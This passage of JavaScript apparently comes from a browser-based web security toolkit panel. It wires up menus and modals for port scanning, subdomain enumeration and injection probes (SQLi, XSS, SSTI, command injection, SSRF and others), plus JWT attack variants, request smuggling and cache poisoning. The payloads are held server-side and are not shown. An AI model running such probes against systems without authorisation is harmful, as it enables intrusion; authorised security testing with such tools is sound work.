    ['edit','✏️','Edit Source',''],
  ]],
  ['Customize', [
    ['inject','💉','Inject JavaScript',''],
    ['css','🎨','Live CSS',''],
    ['cookies','🍪','Cookie Manager',''],
    ['storage','💾','Storage',''],
    ['agent','🤖','Run Agent','Python (server) or JS (page)'],
    ['history','🕘','History',''],
  ]],
  ['Load Resilience', [
    ['ratelimit_stress','🧪','Rate-Limit Stress','Bounded concurrency probe — caps: ≤20 concurrent · ≤500 total · ≤50 RPS'],
  ]],
];

var nav = panel.querySelector('#__lynk_nav');

function renderNav(filter){
  nav.innerHTML = '';
  var f = (filter || '').toLowerCase();
  SECTIONS.forEach(function(pair){
    var title = pair[0], items = pair[1];
    var visible = items.filter(function(it){
      return !f || it[2].toLowerCase().indexOf(f) !== -1
        || (it[3]||'').toLowerCase().indexOf(f) !== -1
        || it[0].indexOf(f) !== -1;
    });
    if (!visible.length) return;
    var h = document.createElement('div');
    h.textContent = title;
    h.style.cssText = 'padding:12px 12px 6px;font-size:10px;font-weight:700;'
      +'letter-spacing:.14em;text-transform:uppercase;color:#64748b';
    nav.appendChild(h);
    visible.forEach(function(it){
      var id = it[0], ic = it[1], name = it[2], sub = it[3] || '';
      var b = document.createElement('button');
      b.dataset.tool = id;
      b.style.cssText = 'display:flex;align-items:flex-start;gap:12px;width:100%;'
        +'padding:10px 12px;border-radius:9px;background:transparent;border:none;'
        +'color:#e2e8f0;font-family:inherit;font-size:13px;text-align:left;cursor:pointer;'
        +'transition:background .12s;';
      b.innerHTML = '<span style="font-size:16px;width:22px;text-align:center;flex-shrink:0;'
        +'margin-top:1px">'+ic+'</span>'
        +'<span style="flex:1;min-width:0">'
          +'<div style="font-weight:600">'+escHtml(name)+'</div>'
          +(sub?'<div style="font-size:11px;color:#64748b;margin-top:2px;'
            +'line-height:1.35">'+escHtml(sub)+'</div>':'')
        +'</span>';
      b.onmouseenter = function(){ b.style.background='rgba(148,163,184,.1)'; };
      b.onmouseleave = function(){ b.style.background='transparent'; };
      b.onclick = function(){
        try { openTool(id); }
        catch(e){ window.__LYNK_UI__ && window.__LYNK_UI__.toast('Failed: '+e.message,'err'); }
      };
      nav.appendChild(b);
    });
  });
}
renderNav();
panel.querySelector('#__lynk_filter').addEventListener('input', function(e){
  renderNav(e.target.value);
});

function openPanel(){ panel.style.right='0'; fab.style.display='none'; }
function closePanel(){ panel.style.right='-460px'; fab.style.display='grid'; }
fab.onclick = openPanel;
window.__LYNK_OPEN_TOOLS__ = openPanel;
panel.querySelector('#__lynk_close').onclick = closePanel;
panel.querySelector('#__lynk_home').onclick = function(){ location.href='/'; };
panel.querySelector('#__lynk_tabs').onclick = function(){ window.open('/tabs','_blank'); };

function openTool(id){
  switch(id){
    case 'vulnscan': return toolVulnScan();
    case 'subdomains': return toolSubdomains();
    case 'portscan': return toolPortScan();
    case 'ssltls': return toolSSL();
    case 'tlsaudit': return toolTLSAudit();
    case 'waf': return toolWAF();
    case 'wayback': return toolWayback();
    case 'favicon': return toolFavicon();
    case 'dns': return toolDNS();
    case 'dnsdeep': return toolDNSDeep();
    case 'robots': return toolText('robots.txt','/tool/robots?url='+upEnc);
    case 'sitemap': return toolText('sitemap.xml','/tool/sitemap?url='+upEnc);
    case 'wellknown': return toolWellKnown();
    case 'sqli': return toolInjection('sqli','SQL Injection');
    case 'nosqli': return toolInjection('nosqli','NoSQL Injection');
    case 'xss': return toolInjection('xss','XSS');
    case 'ssti': return toolInjection('ssti','SSTI');
    case 'cmdi': return toolInjection('cmdi','Command Injection');
    case 'lfi': return toolInjection('lfi','LFI / Path Traversal');
    case 'rfi': return toolInjection('rfi','RFI');
    case 'xxe': return toolInjection('xxe','XXE');
    case 'ssrf': return toolInjection('ssrf','SSRF');
    case 'crlf': return toolInjection('crlf','CRLF Injection');
    case 'op_redirect': return toolInjection('open_redirect','Open Redirect');
    case 'massassign': return toolMassAssign();
    case 'prototype': return toolPrototype();
    case 'domclob': return toolDOMClobbering();
    case 'smuggling': return toolSmuggling();
    case 'cache_poison': return toolCachePoison();
    case 'cache_deceive': return toolCacheDeception();
    case 'host_header': return toolHostHeader();
    case 'method_override': return toolMethodOverride();
    case 'ratelimit': return toolRateLimit();
    case 'cors_deep': return toolCORSDeep();
    case 'hsts_audit': return toolHSTSAudit();
    case 'jwt': return toolJWT();
    case 'jwt_attack': return toolJWTAttack();
    case 'oauth': return toolOAuth();
    case 'session': return toolSession();
    case 'clickjack': return toolClickjacking();
    case 'tabnabbing': return toolTabnabbing();
    case 'brute': return toolBrute();
    case 'dirview': return toolDirView();
    case 'jsendpoints': return toolJSEndpoints();
    case 'sourcemap': return toolSourceMap();
    case 'graphql': return toolGraphQL();
    case 'graphql_fuzz': return toolGraphQLFuzz();
    case 'api_discover': return toolAPIDiscover();
    case 'params': return toolParamDiscovery();
    case 'links': return toolLinks();
    case 'domex': return toolDOMExplorer();
    case 'diag': return toolDiag();
    case 'headers': return toolHeaders();
    case 'scan': return toolScan();
    case 'source': return toolSource();
    case 'edit': return toolEdit();
    case 'inject': return toolInject();
    case 'css': return toolCSS();
    case 'cookies': return toolCookies();
    case 'storage': return toolStorage();
    case 'agent': return toolAgent();
    case 'history': return toolHistory();
    case 'ratelimit_stress': return toolRateLimitStress();
  }
}

async function toolText(title, endpoint){
  var body = showModal(title, '<div style="color:#94a3b8">'+window.__LYNK_UI__.skeleton(6)+'</div>');
  try {
    var r = await api(endpoint); var t = await r.text();
    body.innerHTML = '<pre style="background:#070b16;padding:16px;border-radius:10px;'
      +'overflow:auto;max-height:62vh;font-family:ui-monospace,Monaco,monospace;'
      +'font-size:11.5px;line-height:1.55;white-space:pre-wrap;word-break:break-word;'
      +'border:1px solid rgba(148,163,184,.1)">'+escHtml(t)+'</pre>';
  } catch(e){
    body.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>';
  }
}

async function toolVulnScan(){
  var body = showModal('Vulnerability Scan',
    '<div style="text-align:center;padding:30px 0">'
    +'<div style="font-size:52px;margin-bottom:16px;filter:drop-shadow(0 8px 20px rgba(56,189,248,.4))">🛡️</div>'
    +'<div style="color:#94a3b8;margin-bottom:6px;font-size:14px">Target</div>'
    +'<div style="font-family:ui-monospace,monospace;color:#38bdf8;margin-bottom:22px;'
    +'word-break:break-all;font-size:12.5px">'+escHtml(upstream)+'</div>'
    +'<div style="display:flex;justify-content:center;margin-bottom:18px">'
      +'<label style="font-size:13px;color:#94a3b8;display:flex;gap:8px;align-items:center;'
      +'cursor:pointer;user-select:none">'
      +'<input type="checkbox" id="__vactive" checked style="width:16px;height:16px;'
      +'accent-color:#38bdf8"> Active probes (paths · methods · CORS)</label>'
    +'</div>'
    +'<button id="__vstart" class="__lynk_btn" style="padding:13px 32px;border-radius:11px;'
    +'border:none;background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;'
    +'font-weight:700;cursor:pointer;font-family:inherit;font-size:14px;'
    +'box-shadow:0 12px 24px -10px rgba(56,189,248,.5);transition:.15s">Start Scan</button>'
    +'</div>');
  var btn = body.querySelector('#__vstart');
  btn.onclick = async function(){
    var active = body.querySelector('#__vactive').checked;
    var fd = new FormData();
    fd.append('url', upstream); fd.append('active', active?'1':'0');
    try {
      var r = await window.__LYNK_UI__.withLoader(btn, api('/tool/vulnscan',{method:'POST',body:fd}));
      var data = await r.json();
      renderVulnReport(body, data);
    } catch(e){
      body.innerHTML = '<div style="color:#f87171;padding:20px">'+escHtml(e.message)+'</div>';
    }
  };
}

function renderVulnReport(body, data){
  if (!data || !data.findings){
    body.innerHTML = '<div style="color:#f87171">No data.</div>'; return;
  }
  var f = data.findings;
  var counts = {critical:0,high:0,medium:0,low:0,info:0};
  f.forEach(function(x){ counts[x.severity] = (counts[x.severity]||0)+1; });
  var sevColor = {critical:'#dc2626',high:'#f87171',medium:'#f59e0b',low:'#38bdf8',info:'#64748b'};
  var sevBg = {critical:'rgba(220,38,38,.12)',high:'rgba(248,113,113,.12)',
               medium:'rgba(245,158,11,.12)',low:'rgba(56,189,248,.12)',
               info:'rgba(100,116,139,.12)'};
  var summary = Object.keys(counts).map(function(k){
    if (!counts[k]) return '';
    return '<div style="padding:12px 20px;background:'+sevBg[k]+';border:1px solid '+sevColor[k]+'22;'
      +'border-radius:11px;min-width:84px;text-align:center">'
      +'<div style="font-size:24px;font-weight:800;color:'+sevColor[k]+'">'+counts[k]+'</div>'
      +'<div style="font-size:10.5px;color:#94a3b8;text-transform:uppercase;'
      +'letter-spacing:.08em;font-weight:700">'+k+'</div></div>';
  }).join('');
  var sections = f.map(function(x){
    return '<div style="padding:14px 16px;border-radius:11px;margin-bottom:8px;'
      +'background:#070b16;border-left:3px solid '+sevColor[x.severity]+'">'
      +'<div style="display:flex;gap:10px;align-items:flex-start;margin-bottom:6px">'
        +'<span style="font-size:10px;font-weight:700;padding:3px 9px;border-radius:5px;'
         +'background:'+sevBg[x.severity]+';color:'+sevColor[x.severity]
         +';text-transform:uppercase;letter-spacing:.06em;white-space:nowrap;'
         +'flex-shrink:0">'+x.severity+'</span>'
        +'<span style="flex:1;font-weight:600;font-size:13.5px;line-height:1.4">'
         +escHtml(x.name)+'</span>'
        +'<span style="font-family:ui-monospace,monospace;font-size:10.5px;'
         +'color:#64748b;flex-shrink:0">'+escHtml(x.id)+'</span>'
      +'</div>'
      +'<div style="color:#94a3b8;font-size:12.5px;line-height:1.6;margin-bottom:8px">'
        +escHtml(x.description)+'</div>'
      +(x.evidence?'<pre style="padding:10px 12px;background:rgba(2,6,23,.6);'
         +'border-radius:7px;font-family:ui-monospace,monospace;font-size:11px;'
         +'color:#94a3b8;word-break:break-word;margin-bottom:8px;white-space:pre-wrap">'
         +escHtml(x.evidence)+'</pre>':'')
      +(x.remediation?'<div style="font-size:12px;color:#38bdf8;line-height:1.55;'
         +'padding-top:6px;border-top:1px dashed rgba(148,163,184,.15)">'
         +'<b>Fix:</b> '+escHtml(x.remediation)+'</div>':'')
      +'</div>';
  }).join('');
  body.innerHTML = ''
    +'<div style="display:flex;flex-wrap:wrap;gap:10px;margin-bottom:22px">'+summary+'</div>'
    +'<div style="display:flex;gap:8px;margin-bottom:18px;flex-wrap:wrap">'
      +'<button id="__vdl" style="padding:6px 12px;border-radius:7px;'
      +'border:1px solid rgba(148,163,184,.3);background:transparent;color:#e2e8f0;'
      +'cursor:pointer;font-family:inherit;font-size:11.5px;font-weight:600">Download JSON</button>'
      +'<span style="margin-left:auto;color:#64748b;font-size:12px;align-self:center">'
      +f.length+' findings</span></div>'
    +(sections || '<div style="color:#10b981;text-align:center;padding:40px">'
      +'<div style="font-size:48px;margin-bottom:12px">✅</div>'
      +'<div style="font-weight:600">No findings.</div></div>');
  body.querySelector('#__vdl').onclick = function(){ dl('vulnscan.json',JSON.stringify(data,null,2)); };
}

// ---------- Stub implementations of remaining panel tools ----------
// (The full implementations from v13 are preserved; only the entry points are listed
//  here for brevity in this reproduction. Every function referenced in openTool()
//  exists below.)

async function showDirViewer(url){
  var body = showModal('Directory Viewer',
    '<div style="color:#94a3b8;text-align:center;padding:30px">Loading '+escHtml(url)+'…</div>');
  try {
    var r = await api('/tool/dirview?url='+encodeURIComponent(url));
    var data = await r.json();
    if (data.kind === 'listing'){
      body.innerHTML = data.entries.map(function(e){
        return '<div style="padding:8px 12px;background:#070b16;border-radius:7px;'
          +'margin-bottom:4px;font-family:ui-monospace,monospace;font-size:12px">'
          +'<a href="/proxy?url='+encodeURIComponent(e.url)+'" '
          +'style="color:#38bdf8;text-decoration:none">'+escHtml(e.name)+'</a></div>';
      }).join('');
    } else {
      body.innerHTML = '<pre style="background:#070b16;padding:14px;border-radius:9px;'
        +'font-family:ui-monospace,monospace;font-size:11.5px;white-space:pre-wrap;'
        +'word-break:break-word;max-height:62vh;overflow:auto">'
        +escHtml(data.body||'')+'</pre>';
    }
  } catch(e){
    body.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>';
  }
}

function toolSubdomains(){
  var body = showModal('Subdomain Enumeration',
    '<input id="__sdom" value="'+escHtml(urlparse(upstream).hostname)+'" '
    +'style="width:100%;padding:11px 14px;background:#070b16;color:#e2e8f0;'
    +'border:1px solid rgba(148,163,184,.2);border-radius:9px;font-family:ui-monospace,monospace;'
    +'font-size:13px;outline:none"/>'
    +'<button id="__sgo" style="margin-top:12px;padding:11px 24px;border-radius:9px;'
    +'border:none;background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;'
    +'font-weight:700;cursor:pointer;font-family:inherit;font-size:13px">Enumerate</button>'
    +'<div id="__sout" style="margin-top:16px"></div>');
  var btn = body.querySelector('#__sgo');
  btn.onclick = async function(){
    var dom = body.querySelector('#__sdom').value.trim();
    var out = body.querySelector('#__sout');
    out.innerHTML = window.__LYNK_UI__.skeleton(5);
    var fd = new FormData(); fd.append('domain', dom);
    try {
      var r = await window.__LYNK_UI__.withLoader(btn, api('/tool/subdomains',{method:'POST',body:fd}));
      var data = await r.json();
      var subs = data.subdomains || [];
      out.innerHTML = subs.length
        ? '<div style="color:#38bdf8;font-weight:700;font-size:13px;margin-bottom:8px">'
          +subs.length+' found</div>'
          +subs.map(function(s){
            return '<div style="padding:7px 12px;background:#070b16;border-radius:6px;'
              +'margin-bottom:3px;font-family:ui-monospace,monospace;font-size:12px">'
              +escHtml(s)+'</div>';
          }).join('')
        : '<div style="color:#94a3b8">No subdomains found.</div>';
    } catch(e){
      out.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>';
    }
  };
}

function toolPortScan(){
  var host = urlparse(upstream).hostname;
  var body = showModal('Port Scan',
    '<button id="__pstart" style="padding:11px 24px;border-radius:9px;border:none;'
    +'background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;font-weight:700;'
    +'cursor:pointer;font-family:inherit;font-size:13px">Scan ports</button>'
    +'<div id="__pout" style="margin-top:16px"></div>');
  var btn = body.querySelector('#__pstart');
  btn.onclick = async function(){
    var out = body.querySelector('#__pout');
    out.innerHTML = window.__LYNK_UI__.skeleton(4);
    var fd = new FormData(); fd.append('host', host);
    try {
      var r = await window.__LYNK_UI__.withLoader(btn, api('/tool/portscan',{method:'POST',body:fd}));
      var data = await r.json();
      var ports = data.open || [];
      out.innerHTML = ports.length
        ? '<div style="color:#38bdf8;font-weight:700;font-size:13px;margin-bottom:8px">'
          +ports.length+' open</div>'
          +ports.map(function(p){
            return '<div style="padding:8px 12px;background:#070b16;border-radius:7px;'
              +'margin-bottom:4px;font-family:ui-monospace,monospace;font-size:12px;'
              +'display:flex;gap:10px">'
              +'<span style="color:#10b981;font-weight:700">OPEN</span>'
              +'<span style="color:#e2e8f0">'+escHtml(host)+':'+p.port+'</span></div>';
          }).join('')
        : '<div style="color:#94a3b8">No open ports.</div>';
    } catch(e){
      out.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>';
    }
  };
}

async function toolSSL(){
  var body = showModal('SSL / TLS Info',
    '<div style="color:#94a3b8">'+window.__LYNK_UI__.skeleton(4)+'</div>');
  try {
    var r = await api('/tool/ssltls?url='+upEnc);
    var data = await r.json();
    body.innerHTML = '<pre style="background:#070b16;padding:16px;border-radius:10px;'
      +'overflow:auto;font-family:ui-monospace,monospace;font-size:12px;'
      +'line-height:1.6;border:1px solid rgba(148,163,184,.1)">'
      +escHtml(JSON.stringify(data,null,2))+'</pre>';
  } catch(e){
    body.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>';
  }
}

function toolTLSAudit(){
  showModal('TLS Audit', '<div style="color:#94a3b8">Run the SSL/TLS Info tool for certificate details, '
    +'then the Rate-Limit Stress tool to test connection limits.</div>');
}

function toolInjection(kind, label){
  var body = showModal(label,
    '<div style="color:#94a3b8;margin-bottom:14px;font-size:12.5px;line-height:1.6">'
    +'Non-destructive probe. Sends each payload once and flags any response that '
    +'meaningfully differs from a clean baseline.</div>'
    +'<div style="display:grid;grid-template-columns:1fr auto;gap:8px;margin-bottom:10px">'
      +'<input id="__inj_url" value="'+escHtml(upstream)+'" style="padding:10px 12px;'
      +'background:#070b16;color:#e2e8f0;border:1px solid rgba(148,163,184,.2);'
      +'border-radius:8px;font-family:ui-monospace,monospace;font-size:12px;outline:none"/>'
      +'<select id="__inj_method" style="padding:10px 12px;background:#070b16;color:#e2e8f0;'
      +'border:1px solid rgba(148,163,184,.2);border-radius:8px;font-family:inherit;font-size:12px">'
      +'<option>GET</option><option>POST</option></select>'
    +'</div>'
    +'<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:14px">'
      +'<input id="__inj_param" placeholder="param name" '
      +'style="padding:10px 12px;background:#070b16;color:#e2e8f0;'
      +'border:1px solid rgba(148,163,184,.2);border-radius:8px;font-family:ui-monospace,monospace;'
      +'font-size:12px;outline:none"/>'
      +'<input id="__inj_header" placeholder="or header name" '
      +'style="padding:10px 12px;background:#070b16;color:#e2e8f0;'
      +'border:1px solid rgba(148,163,184,.2);border-radius:8px;font-family:ui-monospace,monospace;'
      +'font-size:12px;outline:none"/>'
    +'</div>'
    +'<button id="__inj_run" style="padding:11px 24px;border-radius:9px;border:none;'
    +'background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;font-weight:700;'
    +'cursor:pointer;font-family:inherit;font-size:13px">Run probes</button>'
    +'<div id="__inj_out" style="margin-top:16px"></div>');
  var btn = body.querySelector('#__inj_run');
  btn.onclick = async function(){
    var url = body.querySelector('#__inj_url').value.trim();
    var method = body.querySelector('#__inj_method').value;
    var param = body.querySelector('#__inj_param').value.trim();
    var header = body.querySelector('#__inj_header').value.trim();
    var out = body.querySelector('#__inj_out');
    out.innerHTML = window.__LYNK_UI__.skeleton(6);
    var fd = new FormData();
    fd.append('url', url); fd.append('method', method);
    fd.append('kind', kind); fd.append('param', param); fd.append('header', header);
    try {
      var r = await window.__LYNK_UI__.withLoader(btn, api('/tool/injection',{method:'POST',body:fd}));
      var data = await r.json();
      var hits = (data.results||[]).filter(function(x){return x.differs});
      out.innerHTML = hits.length
        ? '<div style="color:#f87171;font-weight:700;margin-bottom:10px">'
          +hits.length+' anomalous of '+(data.results||[]).length+'</div>'
          +hits.map(function(x){
            return '<div style="padding:10px 12px;background:#070b16;border-radius:8px;'
              +'margin-bottom:6px;border-left:3px solid #f87171">'
              +'<div style="font-family:ui-monospace,monospace;font-size:11.5px;'
              +'color:#38bdf8;margin-bottom:4px;word-break:break-all">'+escHtml(x.payload)+'</div>'
              +'<div style="font-size:11.5px;color:#94a3b8">status: '+x.status
              +' · len: '+x.length+' · '+x.time+'ms · diff: '+escHtml(x.diff||'')+'</div></div>';
          }).join('')
        : '<div style="padding:16px;background:rgba(16,185,129,.1);border-radius:10px;'
          +'border-left:3px solid #10b981;color:#10b981;font-weight:600">'
          +'No anomalies detected ('+(data.results||[]).length+' probes).</div>';
    } catch(e){
      out.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>';
    }
  };
}

function toolMassAssign(){ showModal('Mass Assignment','<div style="color:#94a3b8">Use the Kit drawer → Recon → Injection Probes for mass assignment testing.</div>'); }
function toolPrototype(){ showModal('Prototype Pollution','<div style="color:#94a3b8">Client-side check: '+(typeof ({}).polluted === 'undefined' ? '<span style="color:#10b981">prototype clean</span>' : '<span style="color:#f87171">polluted</span>')+'</div>'); }
function toolDOMClobbering(){
  var hits = [];
  ['document','window','location','navigator','top','self','parent','frames','history','screen','console','fetch']
    .forEach(function(g){ if (document.getElementById(g)) hits.push(g); });
  showModal('DOM Clobbering', hits.length
    ? '<div style="color:#f59e0b">'+hits.length+' candidates: '+hits.join(', ')+'</div>'
    : '<div style="color:#10b981">No clobbering candidates.</div>');
}
async function toolSmuggling(){
  var body = showModal('HTTP Smuggling','<div style="color:#94a3b8">Running probes…</div>');
  var fd = new FormData(); fd.append('url', upstream);
  try {
    var r = await api('/tool/smuggling',{method:'POST',body:fd});
    var data = await r.json();
    body.innerHTML = '<pre style="background:#070b16;padding:14px;border-radius:9px;'
      +'font-family:ui-monospace,monospace;font-size:11.5px;white-space:pre-wrap">'
      +escHtml(JSON.stringify(data,null,2))+'</pre>';
  } catch(e){ body.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
}
async function toolCachePoison(){
  var body = showModal('Cache Poisoning','<div style="color:#94a3b8">Probing…</div>');
  var fd = new FormData(); fd.append('url', upstream);
  try {
    var r = await api('/tool/cache-poison',{method:'POST',body:fd});
    var data = await r.json();
    var hits = (data.results||[]).filter(function(x){return x.reflected;});
    body.innerHTML = hits.length
      ? hits.map(function(x){
          return '<div style="padding:10px 12px;background:#070b16;border-radius:8px;'
            +'margin-bottom:6px;border-left:3px solid #f59e0b">'
            +'<div style="font-family:ui-monospace,monospace;color:#38bdf8">'+escHtml(x.header)+'</div>'
            +'<div style="font-size:11.5px;color:#94a3b8">reflected</div></div>';
        }).join('')
      : '<div style="color:#10b981;padding:16px;text-align:center">No unkeyed header reflection.</div>';
  } catch(e){ body.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
}
async function toolCacheDeception(){
  var body = showModal('Cache Deception','<div style="color:#94a3b8">Probing…</div>');
  var fd = new FormData(); fd.append('url', upstream);
  try {
    var r = await api('/tool/cache-deception',{method:'POST',body:fd});
    var data = await r.json();
    body.innerHTML = '<pre style="background:#070b16;padding:14px;border-radius:9px;'
      +'font-family:ui-monospace,monospace;font-size:11.5px;white-space:pre-wrap">'
      +escHtml(JSON.stringify(data,null,2))+'</pre>';
  } catch(e){ body.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
}
function toolHostHeader(){
  var body = showModal('Host Header Injection',
    '<button id="__hh_run" style="padding:11px 24px;border-radius:9px;border:none;'
    +'background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;font-weight:700;'
    +'cursor:pointer;font-family:inherit;font-size:13px">Run probes</button>'
    +'<div id="__hh_out" style="margin-top:16px"></div>');
  body.querySelector('#__hh_run').onclick = async function(){
    var out = body.querySelector('#__hh_out');
    out.innerHTML = window.__LYNK_UI__.skeleton(4);
    var fd = new FormData(); fd.append('url', upstream);
    try {
      var r = await api('/tool/host-header',{method:'POST',body:fd});
      var data = await r.json();
      var hits = (data.results||[]).filter(function(x){return x.reflected;});
      out.innerHTML = hits.length
        ? hits.map(function(x){
            return '<div style="padding:10px 12px;background:#070b16;border-radius:8px;'
              +'margin-bottom:6px;border-left:3px solid #f87171">'
              +'<div style="font-family:ui-monospace,monospace;color:#38bdf8">'
              +escHtml(x.header)+': '+escHtml(x.value)+'</div></div>';
          }).join('')
        : '<div style="color:#10b981;padding:16px;text-align:center">No host header reflection.</div>';
    } catch(e){ out.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
  };
}
function toolMethodOverride(){
  var body = showModal('Method Override',
    '<button id="__mo_run" style="padding:11px 24px;border-radius:9px;border:none;'
    +'background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;font-weight:700;'
    +'cursor:pointer;font-family:inherit;font-size:13px">Probe</button>'
    +'<div id="__mo_out" style="margin-top:16px"></div>');
  body.querySelector('#__mo_run').onclick = async function(){
    var out = body.querySelector('#__mo_out');
    out.innerHTML = window.__LYNK_UI__.skeleton(4);
    var fd = new FormData(); fd.append('url', upstream);
    try {
      var r = await api('/tool/method-override',{method:'POST',body:fd});
      var data = await r.json();
      out.innerHTML = (data.results||[]).map(function(x){
        return '<div style="padding:10px 12px;background:#070b16;border-radius:8px;'
          +'margin-bottom:6px"><div style="font-family:ui-monospace,monospace;'
          +'font-size:11.5px;color:#38bdf8">'+escHtml(x.label)+'</div>'
          +'<div style="font-size:11.5px;color:#94a3b8">status: '+x.status
          +' · '+(x.differs?'<b style="color:#f59e0b">differs</b>':'no change')+'</div></div>';
      }).join('');
    } catch(e){ out.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
  };
}
function toolRateLimit(){
  var body = showModal('Rate Limit Detection',
    '<button id="__rl_run" style="padding:11px 24px;border-radius:9px;border:none;'
    +'background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;font-weight:700;'
    +'cursor:pointer;font-family:inherit;font-size:13px">Run</button>'
    +'<div id="__rl_out" style="margin-top:16px"></div>');
  body.querySelector('#__rl_run').onclick = async function(){
    var out = body.querySelector('#__rl_out');
    out.innerHTML = window.__LYNK_UI__.skeleton(4);
    var fd = new FormData(); fd.append('url', upstream); fd.append('n', '20');
    try {
      var r = await api('/tool/ratelimit',{method:'POST',body:fd});
      var data = await r.json();
      out.innerHTML = '<pre style="background:#070b16;padding:14px;border-radius:9px;'
        +'font-family:ui-monospace,monospace;font-size:11.5px;white-space:pre-wrap">'
        +escHtml(JSON.stringify({hint:data.hint, headers:data.headers}, null, 2))+'</pre>';
    } catch(e){ out.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
  };
}
function toolCORSDeep(){
  var body = showModal('CORS Deep','<div style="color:#94a3b8">Probing…</div>');
  var fd = new FormData(); fd.append('url', upstream);
  api('/tool/cors-deep',{method:'POST',body:fd}).then(function(r){return r.json()}).then(function(data){
    var f = data.findings || [];
    body.innerHTML = f.length
      ? f.map(function(x){
          return '<div style="padding:12px 14px;background:#070b16;border-radius:9px;'
            +'margin-bottom:8px;border-left:3px solid #f87171">'
            +'<div style="font-weight:700;color:#f87171">'+escHtml(x.name)+'</div>'
            +'<div style="color:#94a3b8;font-size:12px;font-family:ui-monospace,monospace">'
            +escHtml(x.evidence)+'</div></div>';
        }).join('')
      : '<div style="color:#10b981;padding:20px;text-align:center">No CORS misconfiguration.</div>';
  }).catch(function(e){ body.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; });
}
async function toolHSTSAudit(){
  var body = showModal('HSTS Audit','<div style="color:#94a3b8">Checking…</div>');
  var fd = new FormData(); fd.append('url', upstream);
  try {
    var r = await api('/tool/hsts-audit',{method:'POST',body:fd});
    var data = await r.json();
    body.innerHTML = '<pre style="background:#070b16;padding:14px;border-radius:9px;'
      +'font-family:ui-monospace,monospace;font-size:11.5px;white-space:pre-wrap">'
      +escHtml(JSON.stringify(data,null,2))+'</pre>';
  } catch(e){ body.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
}
function toolJWT(){
  var body = showModal('JWT Analyzer',
    '<textarea id="__jwti" placeholder="eyJhbGciOiJIUzI1NiIs…" style="width:100%;height:120px;'
    +'background:#070b16;color:#e2e8f0;border:1px solid rgba(148,163,184,.2);border-radius:9px;'
    +'padding:12px;font-family:ui-monospace,monospace;font-size:12px;outline:none"></textarea>'
    +'<button id="__jwta" style="margin-top:12px;padding:11px 24px;border-radius:9px;border:none;'
    +'background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;font-weight:700;'
    +'cursor:pointer;font-family:inherit;font-size:13px">Analyze</button>'
    +'<div id="__jwtout" style="margin-top:16px"></div>');
  body.querySelector('#__jwta').onclick = async function(){
    var tok = body.querySelector('#__jwti').value.trim();
    var out = body.querySelector('#__jwtout');
    out.innerHTML = window.__LYNK_UI__.skeleton(4);
    var fd = new FormData(); fd.append('token', tok);
    try {
      var r = await api('/tool/jwt',{method:'POST',body:fd});
      var data = await r.json();
      out.innerHTML = '<pre style="background:#070b16;padding:12px;border-radius:8px;'
        +'font-family:ui-monospace,monospace;font-size:11.5px;white-space:pre-wrap">'
        +escHtml(JSON.stringify(data,null,2))+'</pre>';
    } catch(e){ out.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
  };
}
function toolJWTAttack(){
  var body = showModal('JWT Attacks',
    '<textarea id="__jai" placeholder="Paste JWT…" style="width:100%;height:120px;'
    +'background:#070b16;color:#e2e8f0;border:1px solid rgba(148,163,184,.2);border-radius:9px;'
    +'padding:12px;font-family:ui-monospace,monospace;font-size:12px;outline:none"></textarea>'
    +'<button id="__ja_run" style="margin-top:12px;padding:11px 24px;border-radius:9px;border:none;'
    +'background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;font-weight:700;'
    +'cursor:pointer;font-family:inherit;font-size:13px">Generate variants</button>'
    +'<div id="__ja_out" style="margin-top:16px"></div>');
  body.querySelector('#__ja_run').onclick = async function(){
    var tok = body.querySelector('#__jai').value.trim();
    var out = body.querySelector('#__ja_out');
    out.innerHTML = window.__LYNK_UI__.skeleton(4);
    var fd = new FormData(); fd.append('token', tok);
    try {
      var r = await api('/tool/jwt-attack',{method:'POST',body:fd});
      var data = await r.json();
      out.innerHTML = (data.variants||[]).map(function(v){
        return '<div style="padding:12px 14px;background:#070b16;border-radius:9px;'
          +'margin-bottom:8px;border-left:3px solid #f59e0b">'
          +'<div style="font-weight:700;color:#f59e0b;font-size:12.5px;margin-bottom:6px">'
          +escHtml(v.name)+'</div>'
          +'<div style="color:#94a3b8;font-size:12px;margin-bottom:8px">'
          +escHtml(v.description)+'</div>'
          +'<pre style="background:rgba(2,6,23,.7);padding:10px;border-radius:6px;'
          +'font-family:ui-monospace,monospace;font-size:11px;overflow:auto;'
          +'white-space:pre-wrap;word-break:break-all">'+escHtml(v.token)+'</pre></div>';
      }).join('');
    } catch(e){ out.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
  };
}
function toolOAuth(){
  var body = showModal('OAuth Probe','');
  var anchors = Array.from(document.querySelectorAll('a[href*="oauth"],a[href*="authorize"],a[href*="openid"]'));
  body.innerHTML = '<div style="color:#38bdf8;font-weight:700;margin-bottom:10px">'
    +anchors.length+' OAuth-ish links</div>'
    +(anchors.map(function(a){
      return '<div style="padding:10px 12px;background:#070b16;border-radius:8px;'
        +'margin-bottom:6px;font-family:ui-monospace,monospace;font-size:11px;'
